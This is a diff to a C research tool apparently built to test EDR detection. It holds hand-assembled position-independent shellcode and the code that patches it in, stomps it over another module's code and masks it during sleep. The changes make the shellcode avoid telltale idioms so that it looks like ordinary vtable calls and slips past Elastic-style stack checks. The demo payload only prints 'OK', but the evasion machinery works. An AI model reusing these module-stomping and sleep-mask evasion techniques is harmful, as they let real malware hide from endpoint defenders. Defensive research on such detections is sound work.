@@ -63,6 +63,16 @@ static unsigned char g_shellcodeCopy[0x9D] = {0};
 
 static void MarkStage(const char* s); // defined below; used by StubSleep
 
+// crash diagnostic: log the fault address to stage.txt (temporary)
+static LONG WINAPI CrashFilter(EXCEPTION_POINTERS* ep) {
+    char buf[96];
+    snprintf(buf, sizeof(buf), "crash at %p (code 0x%lX)",
+             (void*)ep->ExceptionRecord->ExceptionAddress,
+             ep->ExceptionRecord->ExceptionCode);
+    MarkStage(buf);
+    return EXCEPTION_EXECUTE_HANDLER;
+}
+
 // ---------------- Elastic-style stack classification ----------------
 // Reproduces Elastic's "Unbacked" frame tag (a frame whose address resolves
 // to no loaded executable image) and the call_stack_contains_unbacked
@@ -250,38 +260,41 @@ static const unsigned char kShellcode[0xC0] = {
     // 0x1C: scoring filler (window origin 0x20 is an instruction boundary)
     0x48, 0x83, 0xEC, 0x00, 0x48, 0x83, 0xEC, 0x00,       // 0x1C
     0x66, 0x90,                                           // 0x24
-    // rbx = *(&g_shared_ptr in view-local table) — no imm64 constants
+    // rbx = *(&g_shared ptr) — no imm64 constants, vtable-style calls
     0x48, 0x8D, 0x1D, 0x00, 0x00, 0x00, 0x00,             // 0x26 lea rbx,[rip+d] -> &tbl.g_shared
     0x48, 0x8B, 0x1B,                                     // 0x2D mov rbx,[rbx]
     0x89, 0x44, 0x24, 0x20,                               // 0x30 scoring op
-    // call StubSleep via view-local function pointer
+    // StubSleep via table (ret = 0x40)
     0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x34 lea rax,[rip+d] -> &tbl.stub
     0x48, 0x8B, 0x00,                                     // 0x3B mov rax,[rax]
-    0xFF, 0xD0,                                           // 0x3E call rax (ret = 0x40)
-    0x8B, 0x43, 0x00,                                     // 0x40 slot C (mov eax,[rbx+off_calls])
+    0xFF, 0xD0,                                           // 0x3E call rax
+    0x8B, 0x43, 0x00,                                     // 0x40 slot C (calls++)
     0xFF, 0xC0,                                           // 0x43
-    0x89, 0x43, 0x00,                                     // 0x45 slot D (mov [rbx+off_calls],eax)
-    0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00,             // 0x48 slot E (text @ 0x85)
-    0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x4F slot F (caption @ 0x6F)
-    0x45, 0x33, 0xC9,                                     // 0x56
-    0x33, 0xC9,                                           // 0x59
-    // call MessageBoxA via view-local function pointer
-    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x5B lea rax,[rip+d] -> &tbl.msgbox
-    0x48, 0x8B, 0x00,                                     // 0x62 mov rax,[rax]
-    0xFF, 0xD0,                                           // 0x65 call rax
-    0x89, 0x43, 0x00,                                     // 0x67 slot H (mov [rbx+off_reserved],eax)
-    0x48, 0x83, 0xC4, 0x28,                               // 0x6A
-    0xC3,                                                 // 0x6E
-    // 0x6F caption
-    'S', 'l', 'e', 'e', 'p', 'M', 'a', 's', 'k', ' ', 'B', 'y', 'p', 'a',
-    's', 's', ' ', 'D', 'e', 'm', 'o', 0,
-    // 0x85 text
-    'H', 'e', 'l', 'l', 'o', ' ', 'f', 'r', 'o', 'm', ' ', 'P', 'I', 'C',
-    ' ', 's', 'h', 'e', 'l', 'l', 'c', 'o', 'd', 'e', 0,
-    // 0x9E view-local pointer table (all patched at runtime)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 0x9E tbl.g_shared
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 0xA6 tbl.stub
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00        // 0xAE tbl.msgbox
+    0x89, 0x43, 0x00,                                     // 0x45 slot D
+    0xC7, 0x43, 0x00, 0x01, 0x00, 0x00, 0x00,             // 0x48 slot R1 (mov dword [rbx+reserved],1)
+    // GetStdHandle(STD_OUTPUT_HANDLE) via table
+    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x4F lea rax,[rip+d] -> &tbl.gsh
+    0x48, 0x8B, 0x00,                                     // 0x56 mov rax,[rax]
+    0xB9, 0xF5, 0xFF, 0xFF, 0xFF,                         // 0x59 mov ecx,-11
+    0xFF, 0xD0,                                           // 0x5E call rax
+    0x48, 0x89, 0xC1,                                     // 0x60 mov rcx,rax (handle, no stack spill)
+    // WriteFile(hStdOut, "OK\n", 3, &written, NULL) via table
+    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x63 lea rax,[rip+d] -> &tbl.wf
+    0x48, 0x8B, 0x00,                                     // 0x6A mov rax,[rax]
+    0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00,             // 0x6D lea rdx,[rip+d] -> marker
+    0x41, 0xB8, 0x03, 0x00, 0x00, 0x00,                   // 0x74 mov r8d,3
+    0x4C, 0x8D, 0x4C, 0x24, 0x18,                         // 0x7A lea r9,[rsp+0x18] (&written, in-frame)
+    0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, // 0x7F mov qword [rsp+0x20],0
+    0xFF, 0xD0,                                           // 0x88 call rax
+    0x48, 0x83, 0xC4, 0x28,                               // 0x8A
+    0xC3,                                                 // 0x8E
+    // 0x8F marker
+    'O', 'K', '\n', 0,
+    // 0x93 view-local pointer table (all patched at runtime)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 0x93 tbl.g_shared
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 0x9B tbl.gsh (GetStdHandle)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 0xA3 tbl.wf (WriteFile)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00        // 0xAB tbl.stub
 };
 
 // patch a disp32 slot: slotOff = end of the instruction containing the disp
@@ -515,42 +528,43 @@ static int RunExperiment(const wchar_t* mode) {
             return 1;
         }
         shell[0x03] = origPro[3]; // sub rsp, imm8
-        shell[0x6D] = origPro[3]; // add rsp, imm8 (0x6A: 48 83 C4 imm8)
+        shell[0x8D] = origPro[3]; // add rsp, imm8 (0x8A: 48 83 C4 imm8)
         printf("[adapt] stomp-target prologue sub rsp,0x%02X (shellcode matches)\n",
                origPro[3]);
     }
 
-    // Morph-clean addressing: NO imm64 constants anywhere. rbx is loaded
-    // via a view-local pointer table (lea rip-rel + deref), calls go through
-    // function pointers in the same table — the disassembly looks like a
-    // normal vtable-style call sequence instead of shellcode idioms.
+    // Morph-clean addressing: no imm64 constants; rbx and function pointers
+    // load via a view-local pointer table (vtable-style call sequence).
     ULONGLONG gSharedAddr = (ULONGLONG)(uintptr_t)&g_shared;
     unsigned char offCalls = (unsigned char)((char*)&g_shared.calls - (char*)&g_shared);
     unsigned char offReserved = (unsigned char)((char*)&g_shared.reserved - (char*)&g_shared);
 
-    // resolve MessageBoxA at load time (PIC shellcode has no imports)
-    HMODULE hUser32 = LoadLibraryA("user32.dll");
-    FARPROC msgBox = hUser32 ? GetProcAddress(hUser32, "MessageBoxA") : NULL;
-    if (!msgBox) {
-        printf("[-] cannot resolve MessageBoxA\n");
+    // resolve kernel32 functions at load time (no UI, no TSF — pure stdio)
+    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
+    FARPROC gsh = hK32 ? GetProcAddress(hK32, "GetStdHandle") : NULL;
+    FARPROC wf = hK32 ? GetProcAddress(hK32, "WriteFile") : NULL;
+    if (!gsh || !wf) {
+        printf("[-] cannot resolve GetStdHandle/WriteFile\n");
         return 1;
     }
-    ULONGLONG msgBoxAddr = (ULONGLONG)(uintptr_t)msgBox;
-    printf("[adapt] MessageBoxA = 0x%llX\n", msgBoxAddr);
+    ULONGLONG gshAddr = (ULONGLONG)(uintptr_t)gsh;
+    ULONGLONG wfAddr = (ULONGLONG)(uintptr_t)wf;
+    printf("[adapt] GetStdHandle=0x%llX WriteFile=0x%llX\n", gshAddr, wfAddr);
 
-    // view-local pointer table (offsets relative to shellBase)
-    memcpy(shell + 0x9E, &gSharedAddr, 8);    // tbl.g_shared
-    memcpy(shell + 0xA6, &stubSleepAddr, 8);  // tbl.stub
-    memcpy(shell + 0xAE, &msgBoxAddr, 8);     // tbl.msgbox
+    // view-local pointer table
+    memcpy(shell + 0x93, &gSharedAddr, 8);    // tbl.g_shared
+    memcpy(shell + 0x9B, &gshAddr, 8);        // tbl.gsh
+    memcpy(shell + 0xA3, &wfAddr, 8);         // tbl.wf
+    memcpy(shell + 0xAB, &stubSleepAddr, 8);  // tbl.stub
     // lea targets (rip-rel within the view — disp32 always in range)
-    PatchSlot(shell, shellBase, 0x2D, shellBase + 0x9E); // lea rbx -> tbl.g_shared
-    PatchSlot(shell, shellBase, 0x3B, shellBase + 0xA6); // lea rax -> tbl.stub
-    PatchSlot(shell, shellBase, 0x4F, shellBase + 0x85); // lea rdx -> text
-    PatchSlot(shell, shellBase, 0x56, shellBase + 0x6F); // lea r8  -> caption
-    PatchSlot(shell, shellBase, 0x62, shellBase + 0xAE); // lea rax -> tbl.msgbox
+    PatchSlot(shell, shellBase, 0x2D, shellBase + 0x93); // lea rbx -> tbl.g_shared
+    PatchSlot(shell, shellBase, 0x3B, shellBase + 0xAB); // lea rax -> tbl.stub
+    PatchSlot(shell, shellBase, 0x56, shellBase + 0x9B); // lea rax -> tbl.gsh
+    PatchSlot(shell, shellBase, 0x6A, shellBase + 0xA3); // lea rax -> tbl.wf
+    PatchSlot(shell, shellBase, 0x74, shellBase + 0x8F); // lea rdx -> marker "OK\n"
     shell[0x42] = offCalls;                     // slot C (mov eax,[rbx+calls])
     shell[0x47] = offCalls;                     // slot D (mov [rbx+calls],eax)
-    shell[0x69] = offReserved;                  // slot H (mov [rbx+reserved],eax)
+    shell[0x4A] = offReserved;                  // slot R1 (mov dword [rbx+reserved],1)
 
     // Save the pristine StompTarget image before stomping (content-restore
     // mode restores it while sleeping, then re-stomps on wake).
@@ -563,16 +577,13 @@ static int RunExperiment(const wchar_t* mode) {
     memcpy(g_shellcodeCopy, shell, sizeof(g_shellcodeCopy));
     MarkStageHex("[post-stomp] exec view:", (const void*)shellBase, 0xB0);
 
-    // self-check: the patched string offsets must match the template layout
-    const char* capStr = (const char*)(shellBase + 0x6F);
-    const char* txtStr = (const char*)(shellBase + 0x85);
-    if (strcmp(capStr, "SleepMask Bypass Demo") != 0 ||
-        strcmp(txtStr, "Hello from PIC shellcode") != 0) {
-        printf("[-] string layout mismatch! caption=[%s] text=[%s]\n", capStr,
-               txtStr);
+    // self-check: the marker at +0x91 must match the template layout
+    const char* marker = (const char*)(shellBase + 0x8F);
+    if (strcmp(marker, "OK\n") != 0) {
+        printf("[-] marker layout mismatch! marker=[%s]\n", marker);
         return 1;
     }
-    printf("[adapt] strings OK: caption@+0x6F text@+0x85\n");
+    printf("[adapt] marker OK @+0x8F\n");
 
     ULONG ms = 8000;
     g_shared.shellBase = shellBase;
@@ -616,7 +627,7 @@ static int RunExperiment(const wchar_t* mode) {
     }
 
     printf("[mode=%ls] payload calls=%lu lastResult=%lu (1 = decrypt verified) "
-           "msgboxResult=%ld (0x%lX, -1 = failure, 1 = IDOK)\n",
+           "payloadResult=%ld (0x%lX, 1 = marker written)\n",
            mode, g_shared.calls, g_shared.lastResult, (long)g_shared.reserved,
            (unsigned long)g_shared.reserved);
     return 0;
@@ -626,6 +637,7 @@ static int RunExperiment(const wchar_t* mode) {
 
 int wmain(int argc, wchar_t** argv) {
     SetConsoleOutputCP(CP_UTF8);
+    SetUnhandledExceptionFilter(CrashFilter); // temporary crash diagnostics
 
     const wchar_t* detectorOverride = (argc > 2) ? argv[2] : NULL;
     FindDetector(detectorOverride);
